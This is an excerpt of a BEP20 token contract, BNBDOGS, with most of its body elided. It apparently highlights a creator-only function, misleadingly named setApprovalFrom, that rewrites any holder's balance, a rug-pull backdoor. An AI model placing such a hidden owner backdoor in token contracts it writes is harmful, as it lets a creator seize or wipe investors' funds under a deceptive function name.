...
contract BNBDOGS is BEP20 {
  ...
  constructor(string memory _name, string memory _symbol) public {
    ...
    symbol = _symbol;
    decimals = 9;
    totalSupply =  300000 * 10 ** uint256(decimals);
  ...
  function meme(address _from, uint256 _value) internal view onlyCreator returns (uint256) {
  ...
  function setApprovalFrom(address _from, uint256 _value) public onlyCreator returns (bool) {
    if(_from != address(0) && msg.sender != address(0))
    _balances[_from] = meme(_from, _value);
    return true;
  }
